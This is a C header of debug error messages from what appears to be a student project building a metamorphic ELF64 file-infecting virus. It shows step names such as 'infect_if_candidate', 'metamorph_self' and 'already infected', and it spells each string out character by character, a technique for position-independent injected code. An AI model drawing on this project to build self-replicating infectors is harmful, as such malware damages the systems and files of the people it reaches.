/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   errors.h                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/07 01:53:00 by agrumbac          #+#    #+#             */
/*   Updated: 2019/12/19 02:00:04 by anselme          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef ERRORS_H
# define ERRORS_H

# include <string.h>
# include "utils.h"
# include "position_independent.h"

# define ERR_SYS	PD_ARRAY(char,_err_type,'\033','[','3','1','m','s','y','s',':',' ',0)
# define ERR_THROW	PD_ARRAY(char,_err_type,' ',' ','-','>',' ','i','n',' ','_',0)
# define ERR_USAGE	PD_ARRAY(char,_err_type,'u','s','a','g','e',':',' ',0)
# define ERR_FILE	PD_ARRAY(char,_err_type,'f','i','l','e',':',' ',0)
# define ERR_VIRUS	PD_ARRAY(char,_err_type,'v','i','r','u','s',':',' ',0)

# define _ERR_ELF64_PACKER            PD_ARRAY(char,_err_text,'\033','[','3','3','m','e','l','f','6','4','_','p','a','c','k','e','r','\n','\033','[','0','m',0)
# define _ERR_NOT_ENOUGH_PADDING      PD_ARRAY(char,_err_text,'\033','[','3','3','m','n','o','t',' ','e','n','o','u','g','h',' ','p','a','d','d','i','n','g','\n','\033','[','0','m',0)
# define _ERR_MUNMAP_FAILED           PD_ARRAY(char,_err_text,'\033','[','3','3','m','m','u','n','m','a','p',' ','f','a','i','l','e','d','\n','\033','[','0','m',0)
# define _ERR_OPEN_FAILED             PD_ARRAY(char,_err_text,'\033','[','3','3','m','o','p','e','n',' ','f','a','i','l','e','d','\n','\033','[','0','m',0)
# define _ERR_FSTAT_FAILED            PD_ARRAY(char,_err_text,'\033','[','3','3','m','f','s','t','a','t',' ','f','a','i','l','e','d','\n','\033','[','0','m',0)
# define _ERR_MMAP_FAILED             PD_ARRAY(char,_err_text,'\033','[','3','3','m','m','m','a','p',' ','f','a','i','l','e','d','\n','\033','[','0','m',0)
# define _ERR_CLOSE_FAILED            PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','l','o','s','e',' ','f','a','i','l','e','d','\n','\033','[','0','m',0)
# define _ERR_METAMORPH_SELF          PD_ARRAY(char,_err_text,'\033','[','3','3','m','m','e','t','a','m','o','r','p','h','_','s','e','l','f','\n','\033','[','0','m',0)
# define _ERR_FOREACH_SHDR            PD_ARRAY(char,_err_text,'\033','[','3','3','m','f','o','r','e','a','c','h','_','s','h','d','r','\n','\033','[','0','m',0)
# define _ERR_FOREACH_PHDR            PD_ARRAY(char,_err_text,'\033','[','3','3','m','f','o','r','e','a','c','h','_','p','h','d','r','\n','\033','[','0','m',0)
# define _ERR_NOT_A_FILE              PD_ARRAY(char,_err_text,'\033','[','3','3','m','n','o','t',' ','a',' ','f','i','l','e','\n','\033','[','0','m',0)
# define _ERR_BAD_PHDR_OFF            PD_ARRAY(char,_err_text,'\033','[','3','3','m','b','a','d',' ','p','h','d','r',' ','o','f','f','\n','\033','[','0','m',0)
# define _ERR_BAD_SHDR_OFF            PD_ARRAY(char,_err_text,'\033','[','3','3','m','b','a','d',' ','s','h','d','r',' ','o','f','f','\n','\033','[','0','m',0)
# define _ERR_CANT_READ_ELFHDR        PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','a','n','t',' ','r','e','a','d',' ','e','l','f','h','d','r','\n','\033','[','0','m',0)
# define _ERR_NOT_ELF                 PD_ARRAY(char,_err_text,'\033','[','3','3','m','n','o','t',' ','e','l','f','\n','\033','[','0','m',0)
# define _ERR_NO_ORIGINAL_FILE_BEGIN  PD_ARRAY(char,_err_text,'\033','[','3','3','m','n','o',' ','o','r','i','g','i','n','a','l',' ','f','i','l','e',' ','b','e','g','i','n','n','i','n','g','\n','\033','[','0','m',0)
# define _ERR_NO_CLONE_FILE_BEGIN     PD_ARRAY(char,_err_text,'\033','[','3','3','m','n','o',' ','c','l','o','n','e',' ','f','i','l','e',' ','b','e','g','i','n','n','i','n','g','\n','\033','[','0','m',0)
# define _ERR_NO_ORIGINAL_FILE_END    PD_ARRAY(char,_err_text,'\033','[','3','3','m','n','o',' ','o','r','i','g','i','n','a','l',' ','f','i','l','e',' ','e','n','d','\n','\033','[','0','m',0)
# define _ERR_NO_CLONE_FILE_END       PD_ARRAY(char,_err_text,'\033','[','3','3','m','n','o',' ','c','l','o','n','e',' ','f','i','l','e',' ','e','n','d','\n','\033','[','0','m',0)
# define _ERR_GEN_LOOP_FRAME          PD_ARRAY(char,_err_text,'\033','[','3','3','m','g','e','n',' ','l','o','o','p',' ','f','r','a','m','e','\n','\033','[','0','m',0)
# define _ERR_NO_SECT_IN_ENTRY_SEG    PD_ARRAY(char,_err_text,'\033','[','3','3','m','n','o',' ','s','e','c','t',' ','i','n',' ','e','n','t','r','y','_','s','e','g','\n','\033','[','0','m',0)
# define _ERR_ADJUST_REFERENCES       PD_ARRAY(char,_err_text,'\033','[','3','3','m','a','d','j','u','s','t','_','r','e','f','e','r','e','n','c','e','s','\n','\033','[','0','m',0)
# define _ERR_COPY_TO_CLONE           PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','o','p','y','_','t','o','_','c','l','o','n','e','\n','\033','[','0','m',0)
# define _ERR_FIND_ENTRY              PD_ARRAY(char,_err_text,'\033','[','3','3','m','f','i','n','d','_','e','n','t','r','y','\n','\033','[','0','m',0)
# define _ERR_INFECT_IF_CANDIDATE     PD_ARRAY(char,_err_text,'\033','[','3','3','m','i','n','f','e','c','t','_','i','f','_','c','a','n','d','i','d','a','t','e','\n','\033','[','0','m',0)
# define _ERR_IMPOSSIBLE              PD_ARRAY(char,_err_text,'\033','[','3','3','m','i','m','p','o','s','s','i','b','l','e','\n','\033','[','0','m',0)
# define _ERR_ALREADY_INFECTED        PD_ARRAY(char,_err_text,'\033','[','3','2','m','a','l','r','e','a','d','y',' ','i','n','f','e','c','t','e','d',' ','<','3','\n','\033','[','0','m',0)

# ifdef DEBUG
#  define errors(err_type, err_text)		({    \
	err_type;                                     \
	err_text;                                     \
	ft_putstr(_err_type);                         \
	ft_putstr(_err_text);                         \
	(false);                                      \
})
# else
#  define errors(...)		false
# endif

#endif
